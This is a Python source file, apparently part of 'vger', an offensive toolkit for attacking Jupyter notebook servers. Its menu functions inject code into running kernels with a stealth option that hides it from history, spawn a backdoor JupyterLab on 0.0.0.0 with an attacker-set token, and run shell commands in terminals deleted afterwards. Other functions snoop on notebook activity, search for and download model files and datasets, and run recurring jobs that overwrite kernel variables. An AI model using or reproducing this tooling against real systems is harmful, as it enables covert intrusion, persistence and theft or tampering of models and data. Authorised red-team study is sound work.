import inquirer
import asyncio
from vger.attack import attack_session, run_ephemeral_terminal, snoop, stomp
import json
import base64
import time
import multiprocessing as mp
from vger.connection import Connection, DumbConnection


class Mixin:
    def pick_target(self):
        """
        Select a specific notebook to target on the server (required for some operations).
        """
        session_info = dict()
        self.sessions = self.connection.list_running_jpy_sessions()
        if len(self.sessions) == 0:
            self.connection.print_with_rule("No running notebooks to attach to")
        else:
            for s in self.sessions:
                name = self.connection.jpy_sessions[s]["name"]
                last_active = f"Last Active: {self.connection.jpy_sessions[s]['kernel']['last_activity']}"
                session_info[f"{name:<20} {last_active:<30}"] = s
            select_kernel = [
                inquirer.List(
                    "kernel",
                    message="Which notebook would you like to attach to?",
                    choices=session_info.keys(),
                )
            ]
            answer = inquirer.prompt(select_kernel)
            self.target = session_info[answer["kernel"]]
        return len(self.sessions)

    def inject(self):
        """
        Run code in the context of a notebook runtime. This can be used to overwrite existing variables or modify data.
        """
        attack_menu = [
            inquirer.List(
                name="payload",
                message="Would you like to type your payload or reference an existing .py file?",
                choices=["Type", ".py"],
            )
        ]
        answer = inquirer.prompt(attack_menu)
        if answer["payload"] == "Type":
            payload_str = inquirer.editor("What code would you like to inject?")
        else:
            payload = [
                inquirer.Path(
                    name="path",
                    message="Where is the payload .py? ",
                    path_type=inquirer.Path.FILE,
                    exists=True,
                )
            ]
            answer = inquirer.prompt(payload)
            path = answer["path"].split("? ")[-1]
            with open(path, "r") as f:
                payload_str = f.read()
        silent = [
            inquirer.List(
                "choice",
                message="Would you like show up in the history and modify the execution counter?",
                choices=["Yes (Noisy)", "No (Stealthy)"],
            )
        ]
        answer = inquirer.prompt(silent)
        if "Yes" in answer["choice"]:
            silent = False
        else:
            silent = True
        loop = asyncio.get_event_loop()
        loop.run_until_complete(
            attack_session(self.connection, self.target, payload_str, silent=silent)
        )

    def jupyter_backdoor(self, port=7777, secret=""):
        """
        Launches a new JupyterLab instance. This can be useful for browser-based interaction that you don't want observed.
        """
        loop = asyncio.get_event_loop()
        if len(secret) == 0:
            config = [
                inquirer.Text(
                    "port",
                    message="What port do you want your Jupyter Server to run on?",
                ),
                inquirer.Text(
                    "secret",
                    message="What password do you want to use for authentication?",
                ),
            ]
            config = inquirer.prompt(config)
            port = config["port"]
            secret = config["secret"]
        if self.target:
            loop.run_until_complete(
                attack_session(
                    self.connection,
                    self.target,
                    f"import os; os.system('jupyter lab --ip=0.0.0.0 --port={port} --allow-root --no-browser --NotebookApp.token={secret} >/dev/null 2>/dev/null &')",
                    silent=True,
                    print_out=False,
                )
            )
            self.connection.print_with_rule(f"Backdoor attempted on {port}")
        else:
            self.connection.print_with_rule("Target needed for backdoor")
            if self.pick_target():
                self.jupyter_backdoor(port=port, secret=secret)
            else:
                self.connection.print_with_rule(
                    "Attempting to spawn Jupyter from shell"
                )
                self.connection.print_with_rule("May fail due to missing dependencies")
                self.connection.print_with_rule("Verify success manually")
                launch_jupyter = f"nohup jupyter lab --ip=0.0.0.0 --port={port} --allow-root --no-browser --NotebookApp.token={secret} >/dev/null 2>/dev/null &"
                loop.run_until_complete(
                    run_ephemeral_terminal(
                        self.connection, launch_jupyter, stdout=False
                    )
                )
                self.connection.print_with_rule(f"Backdoor attempted on {port}")

    def dump_history(self):
        """
        Use IPython magic to see the notebook command history.
        """
        loop = asyncio.get_event_loop()
        loop.run_until_complete(
            attack_session(
                self.connection,
                self.target,
                f"%history",
                silent=False,
                print_out=False,
                get_hist=True,
            )
        )

    def switch_target_notebook(self):
        """
        Change target notebook for notebook-specific operations.
        """
        self.connection.list_running_jpy_sessions()
        self.pick_target()
        self.exploit_attack()

    def run_in_shell(self):
        """
        Launches a Jupyter Terminal, runs the command, and deletes the Terminal.
        """
        code = [inquirer.Text("code", "What shell command would you like to run?")]
        answers = inquirer.prompt(code)
        loop = asyncio.get_event_loop()
        loop.run_until_complete(
            run_ephemeral_terminal(self.connection, answers["code"])
        )

    def list_notebooks(self):
        """
        List running notebooks.
        """
        self.sessions = self.connection.list_running_jpy_sessions()
        if len(self.sessions) > 0:
            printable_sessions = [
                f"{self.connection.jpy_sessions[s]['name']:<20} Last Active: {self.connection.jpy_sessions[s]['kernel']['last_activity']:<30}"
                for s in self.connection.jpy_sessions
            ]
            self.connection.print_with_rule("\n".join(printable_sessions))
        else:
            self.connection.print_with_rule("No running notebooks")

    def list_dir(self):
        """
        List directory contents.
        Can also be used to get file contents.
        """
        dir = [
            inquirer.Text(
                "dir",
                "What directory or file would you like to list?",
                default="/",
            )
        ]
        answers = inquirer.prompt(dir)
        results = self.connection.list_dir(answers["dir"])
        with self.connection.con.pager():
            self.connection.print_with_rule(json.dumps(results), json=True)

    def upload(self):
        """
        Upload file from local host to target host.
        """
        payload = [
            inquirer.Path(
                name="path",
                message="What file do you want to upload? ",
                path_type=inquirer.Path.FILE,
                exists=True,
            )
        ]
        answer = inquirer.prompt(payload)
        file_path = answer["path"].split("? ")[-1]
        with open(file_path, "rb") as f:
            payload = f.read()
            payload = base64.b64encode(payload).decode("utf-8")
        target = [
            inquirer.Text("path", "Where do you want to place the file?", default="/")
        ]
        answer = inquirer.prompt(target)
        data = {
            "content": payload,
            "format": "base64",
            "path": answer["path"],
            "type": "file",
        }
        self.connection.print_with_rule(
            self.connection.upload(answer["path"], json.dumps(data))
        )

    def delete(self):
        """
        Delete specific file.
        """
        target = [inquirer.Text("path", "What file do you want to delete?")]
        answer = inquirer.prompt(target)
        response = self.connection.delete(answer["path"])
        if response.status_code == 204:
            self.connection.print_with_rule(f"{answer["path"]} deleted successfully")
        else:
            self.connection.print_with_rule(f"Error deleting {answer["path"]}")

    def snoop_for(self):
        """
        Monitor notebook execution and output for specified time.
        """
        if not self.target:
            self.connection.print_with_rule("You must select a target to snoop on")
            self.pick_target()
            self.snoop_for()
        else:
            answer = [
                inquirer.Text(
                    "seconds", "How many seconds would you like to snoop for?"
                )
            ]
            answer = inquirer.prompt(answer)
            try:
                int(answer["seconds"])
            except (ValueError, KeyboardInterrupt):
                self.connection.print_with_rule("Please specify a timeout in seconds")
                self.menu()
            loop = asyncio.get_event_loop()
            with self.connection.con.status("Snooping..."):
                loop.run_until_complete(
                    snoop(self.connection, self.target, timeout=int(answer["seconds"]))
                )

    def find_files(
        self,
        file_extensions,
        tracker,
        path="/",
    ):
        """
        Search for files based on known file extensions.
        """
        try:
            for file in self.connection.list_dir(path)["content"]:
                if file["type"] == "directory":
                    self.find_files(file_extensions, tracker, file["path"])
                elif (
                    file["type"] == "file"
                    and file["name"].split(".")[-1] in file_extensions
                ):
                    self.connection.print_with_rule(f"Found {file["path"]}")
                    tracker.append(file["path"])
                else:
                    pass
        except KeyError:
            pass

    def find_files_runner(self, file_type="model"):
        """
        find_files() is recursive, this manages the loop.
        """
        if file_type == "model":
            file_extensions = [
                "pkl",
                "pickle",
                "pt",
                "pth",
                "onnx",
                "safetensors",
                "h5",
                "npy",
                "npz",
                "joblib",
                "pb",
                "protobuf",
                "zip",
                "bin",
            ]
            tracker = self.model_paths
        elif file_type == "data":
            file_extensions = ["csv", "json", "jsonl", "parquet", "avro"]
            tracker = self.datasets
        answer = [
            inquirer.Text(
                "path", "What path would you like to recursively search?", default="/"
            ),
            inquirer.Checkbox(
                "extensions",
                "What extensions would you like to search for?",
                choices=file_extensions,
                default=file_extensions,
            ),
        ]
        answer = inquirer.prompt(answer)
        with self.connection.con.status("Searching..."):
            self.find_files(answer["extensions"], tracker, answer["path"])

    def download_files(self, tracker):
        """
        Download discovered artifacts.
        """
        if len(tracker) == 0:
            self.connection.print_with_rule(
                f"You need to find some artifacts first.\nTry Enumerate -> Find [artifact]"
            )
            self.exploit()
        else:
            answer = [
                inquirer.Path(
                    "path",
                    message="What directory would you like to download to?",
                    path_type=inquirer.Path.DIRECTORY,
                    exists=True,
                ),
                inquirer.Checkbox(
                    "artifacts", "What do you want?", choices=tracker, default=tracker
                ),
            ]
            answer = inquirer.prompt(answer)
            path = answer["path"].split("? ")[-1]
            for artifact in answer["artifacts"]:
                name = artifact.split("/")[-1]
                with open(f"{path + name}", "wb") as f:
                    f.write(
                        base64.b64decode(self.connection.list_dir(artifact)["content"])
                    )
                self.connection.print_with_rule(f"{name} downloaded to {path}")

    def export_console(self):
        """
        Save anything that's been printed to the console.
        """
        answer = [
            inquirer.Path(
                "path",
                message="What directory would you like to save your output?",
                path_type=inquirer.Path.DIRECTORY,
                exists=True,
            )
        ]
        answer = inquirer.prompt(answer)
        log_path = f"{answer["path"]}vger-{time.strftime("%Y%m%d-%H%M%S")}.log"
        self.connection.con.save_text(log_path)
        self.connection.print_with_rule(f"Log saved to {log_path}")

    def variable_stomp(self):
        answers = [
            inquirer.Text("job_name", "What do you want to name this job?"),
            inquirer.Editor(
                "objective", "What do you want to run on a recurring basis?"
            ),
            inquirer.Text(
                "sleep", "How many seconds do you want to sleep between runs?"
            ),
        ]
        answers = inquirer.prompt(answers)
        ctx = mp.get_context("spawn")
        x = DumbConnection(self.connection.url, self.connection.secret)
        x.list_running_jpy_sessions()
        p = ctx.Process(
            target=stomp,
            args=(x, self.target, answers["objective"], int(answers["sleep"])),
        )
        self.jobs[answers["job_name"]] = p
        p.start()

    def kill_job(self):
        answers = [
            inquirer.Checkbox(
                "jobs", "What job(s) do you want to kill?", choices=self.jobs.keys()
            )
        ]
        answers = inquirer.prompt(answers)
        for job in answers["jobs"]:
            self.jobs[job].kill()
            self.connection.print_with_rule(f"Killed {job}")
